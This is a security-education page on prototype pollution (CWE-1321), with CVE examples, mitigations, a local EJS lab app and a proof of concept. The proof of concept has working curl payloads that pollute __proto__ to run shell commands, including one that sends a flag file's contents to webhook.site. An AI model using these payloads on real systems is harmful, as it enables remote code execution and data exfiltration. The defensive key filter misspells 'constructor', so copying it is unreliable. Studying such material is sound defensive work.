---
categories:
  - daily_cwe
title: "CWE-1321: Prototype Pollution"
tags: 
  - CWE-1321
  - prototype pollution
---
# IMPROPERLY CONTROLLED MODIFICATION OF OBJECT PROTOTYPE ATTRIBUTES

## Description

The product receives input from an upstream component that specifies attributes that are to be initialized or updated in an object, but it does not properly control modifications of attributes of the object prototype.

Special keys (`__proto__`, `constructor`) can be overriden by user

Impact : Server-Side Prototype Pollution (SSPP) with gadget chain (such as `ejs`, `pug`, `child_process`) can lead to RCE

### Selected Observed Examples

| CVE | Note |
| :--- | :--- |
| **CVE-2020-8203** | Prototype polution by setting object attributes based on dot-separated path |
| **CVE-2019-11358** | Prototype pollution by merging objects recursively |
| **CVE-2019-10744** | Prototype pollution by setting default values to object attributes recursively |
| **CVE-2018-3721** | Prototype pollution by merging objects |

### Potential Mitigations

1. Freezing object prototype first, modification of the prototype becomes impossible. <span style="color: green">Effective: High</span>
2. Blocking modications of attributes that resolve to object prototype (in architecture and design). <span style="color: green">Effective: High</span>
3. Input validation. <span style="color: red">Effective: Limited</span>
4. Using an object without prototypes, adding object prototype attributes by accessing the prototype via the special attributes becomes impossible. <span style="color: green">Effective: High</span>
5. Map can be used instead of objects in most cases. <span style="color: orange">Effective: Moderate</span>

## Implementation

### Basic project structure
```
.
├── Dockerfile
├── package.json
├── flag.txt
├── app.js
└── views/
    └── index.ejs
```

Dockerfile

```Dockerfile
--8<-- "docs/daily_cwe/cwe-1321/source/Dockerfile"
```

package.json

```json
--8<-- "docs/daily_cwe/cwe-1321/source/package.json"
```

app.js

```js
--8<-- "docs/daily_cwe/cwe-1321/source/app.js"
```

views/index.ejs

```html
--8<-- "docs/daily_cwe/cwe-1321/source/views/index.ejs"
```

### Deploy

```docker
docker build -t sspp-demo .
docker run -p 3000:3000 sspp-demo
```

### PoC

Step 1 : Sending prototype pollution payload

```sh
curl -i -XPOST http://localhost:3000/api/settings \
     -H "Content-Type: application/json" \
     -d '{
        "__proto__": {
          "outputFunctionName": "x; process.mainModule.require(\"child_process\").execSync(\"cat /flag.txt > /tmp/flag_out.txt\"); //"
        }
     }'
```
Step 2 : Trigger RCE gadget

```sh
curl -i http://localhost:3000/
```

Step 3 : OOB Exfiltration

```sh
curl -i -XPOST http://localhost:3000/api/settings \
     -H "Content-Type: application/json" \
     -d '{
        "__proto__": {
          "outputFunctionName": "x; process.mainModule.require(\"child_process\").execSync(\"curl http://webhook.site/$(cat /flag.txt)\"); //"
        }
     }'
```

### Explanation

EJS (version < **3.1.10**), `render` function using config variable `outputNameFunction`. If this variable is polluteed, EJS does not sanitize, it leads to Code Injection

### Defense

#### 1. Sanitize dangerous recursive keys

```js
if (key === '__proto__' || key === 'consstructor' || key === 'prototype') {
  continue;
}
```

#### 2. Using `Map` or Object without Prototype

```js
const safeObject = Object.create(null);
```

#### 3. Using `Object.freeze()`

```js
Object.freeze(Object.prototype);
```

#### 4. Update 

Update EJS > 3.1.10